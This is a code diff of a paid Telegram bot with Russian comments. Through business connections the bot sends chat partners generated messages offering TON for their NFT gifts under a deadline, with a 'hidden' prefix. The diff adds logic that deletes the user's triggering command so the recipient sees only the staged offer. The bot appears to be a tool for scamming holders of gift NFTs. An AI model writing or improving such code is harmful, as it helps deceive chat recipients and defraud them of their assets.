@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Fixed Whitelist + Owner Access
+Sulumi Team Bot — Hard Delete Trigger + DB Owner Only
 """
 
 import os
@@ -40,9 +40,8 @@ def btn(text, data, emoji):
 def btn_url(text, url, emoji):
     return {"text": text, "url": url, "icon_custom_emoji_id": E[emoji]}
 
-# ==================== БАЗА ДАННЫХ (SQLite) ====================
-DB_PATH = "sulumi_subscribers.db"
-INITIAL_SUBS = [869789263, 9065970214, 6421577466, 8350337709, 948464755, 9157210232]
+# ==================== БАЗА ДАННЫХ ====================
+DB_PATH = "sulumi_bot.db"
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -50,10 +49,7 @@ def init_db():
     c.execute('''CREATE TABLE IF NOT EXISTS subscribers (
                  user_id INTEGER PRIMARY KEY,
                  expires_at REAL)''')
-    
     c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (OWNER_ID, -1.0))
-    for uid in INITIAL_SUBS:
-        c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (uid, -1.0))
     conn.commit()
     conn.close()
 
@@ -208,17 +204,15 @@ def handle_message(msg):
             sm(cid, "❌ Неверный формат. Напишите username без @", bci=ci)
         return
 
-    # 2. ИГНОРИРОВАНИЕ обычных сообщений (бот молчит)
-    if not txt.startswith("/"): 
+    # 2. ИГНОРИРОВАНИЕ обычных сообщений
+    if not txt.startswith("/"):
         return
 
-    # 3. WHITELIST: команды доступные ВСЕМ без проверки подписки
-    PUBLIC_COMMANDS = ["/start", "/тарифы", "/tariffs", "/help"]
-    
-    # Если команда НЕ в whitelist и пользователь НЕ владелец и НЕ подписчик — блокируем
-    if txt not in PUBLIC_COMMANDS and uid != OWNER_ID and not is_allowed(uid):
-        sm(cid, f"🔒 <b>Доступ закрыт</b>\n\n💰 <b>Купите тариф у @{PAYMENT}</b>\n/тарифы — узнать цены", bci=ci)
-        return
+    # 3. ПРОВЕРКА ДОСТУПА (кроме /start и /тарифы)
+    if txt not in ["/start", "/тарифы", "/tariffs", "/help"]:
+        if uid != OWNER_ID and not is_allowed(uid):
+            sm(cid, f"🔒 <b>Доступ закрыт</b>\n\n💰 <b>Купите тариф у @{PAYMENT}</b>\n/тарифы — узнать цены", bci=ci)
+            return
 
     # 4. ОБРАБОТКА КОМАНД
     if txt == "/start":
@@ -245,7 +239,7 @@ def handle_message(msg):
 🥇 <b>Навсегда</b> — 4.5 TON
 
 💳 <b>Для оплаты:</b>
-Отправьте TON на кошелек и напишите @{PAYMENT} с чеком.""", bci=ci)
+Отправьте TON и напишите @{PAYMENT} с чеком.""", bci=ci)
         return
 
     if txt.startswith("/send"):
@@ -286,11 +280,17 @@ def handle_message(msg):
         sender_name = msg['from'].get('first_name') or msg['from'].get('username') or "Пользователь"
         caption = hidden + f"<b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
 
+        # ШАГ 1: Отправляем оффер
         result = sm_nft(cid, caption, nl, kb=okb(did), bci=sender_bci)
         
         if result.get("ok"):
-            if mid and ci:
-                dm(cid, mid, bci=ci)
+            # ШАГ 2: ЖЕСТКИЙ ТРИГГЕР НА УДАЛЕНИЕ
+            if mid:
+                del_res = dm(cid, mid, bci=ci) # Удаляем через business_connection чата
+                if not del_res.get("ok"):
+                    print(f"⚠️ НЕ УДАЛОСЬ УДАЛИТЬ СООБЩЕНИЕ {mid}: {del_res.get('description')}")
+                else:
+                    print(f"✅ Сообщение с командой {mid} успешно удалено.")
         else:
             err = result.get("description", "err").lower()
             if "business_peer_usage_missing" in err:
